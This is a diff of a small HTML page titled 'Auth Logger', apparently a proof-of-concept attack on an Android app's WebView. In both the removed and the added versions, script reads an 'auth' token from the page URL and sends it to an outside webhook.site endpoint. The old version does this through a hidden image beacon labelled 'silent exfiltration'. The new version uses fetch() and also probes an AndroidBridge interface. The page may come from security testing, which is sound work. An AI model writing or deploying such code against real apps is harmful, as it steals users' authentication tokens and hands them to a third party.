@@ -1,49 +1,37 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auth Logger</title>
 </head>
 <body>
-
-  <button onclick="AndroidBridge.openExternalLink('https://google.com')">
-    Open google.com
-  </button>
-
-  <button onclick="AndroidBridge.openExternalLink('tel:1234567890')">
-    Open tel
-  </button>
-
-  <button onclick="AndroidBridge.openExternalLink('market://details?id=com.android.chrome')">
-    Open Chrome in Play Store
-  </button>
-
-  <pre id="log"></pre>
-
-  <script>
-    const log = (m) =>
-      document.getElementById('log').textContent += m + "\n";
-
-    const params = new URLSearchParams(window.location.search);
-    const auth = params.get("auth");
-
-    if (typeof AndroidBridge === "undefined") {
-      log("AndroidBridge not found.");
-    } else {
-      log("AndroidBridge found.");
-    }
-
-    if (auth) {
-      log("auth parameter detected: " + auth);
-
-      // Silent exfiltration via image beacon
-      const img = new Image();
-      img.src =
-        "https://webhook.site/ead77c75-82b9-4a44-a558-f6145b12e28e/" +
-        encodeURIComponent(auth);
-    } else {
-      log("No auth parameter present.");
-    }
-  </script>
-
+    <pre id="log"></pre>
+    <script>
+        const log = (m) => document.getElementById('log').textContent += m + "\n";
+        const params = new URLSearchParams(window.location.search);
+        const auth = params.get("auth");
+        if (auth) {
+            log("auth parameter detected: " + auth);
+            // Remove the first character of the auth param
+            const modifiedAuth = auth.slice(1);
+            // Construct the URL with /c=modifiedAuth
+            const url = `https://webhook.site/804f337b-de96-452c-b679-d7988577487b/c=${modifiedAuth}`;
+            // Send a GET request to the URL
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        log("Request sent successfully to: " + url);
+                    } else {
+                        log("Failed to send request: " + response.status);
+                    }
+                })
+                .catch(error => {
+                    log("Error sending request: " + error);
+                });
+        } else {
+            log("No auth parameter present.");
+        }
+    </script>
 </body>
 </html>
